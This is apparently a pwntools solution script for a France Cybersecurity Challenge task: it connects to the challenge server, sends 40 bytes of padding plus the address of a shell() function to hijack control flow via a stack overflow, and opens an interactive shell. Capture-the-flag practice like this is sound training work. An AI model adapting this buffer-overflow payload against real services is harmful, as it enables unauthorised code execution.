#!/usr/bin/env python3.8
from pwn import *

r = remote("challenges1.france-cybersecurity-challenge.fr", 4000)

payload = b'A'*40 # padding
payload += p64(0x00400676) # adresse de la fonction shell()

print(r.recvuntil(">>> "))
r.send(payload)
r.interactive()
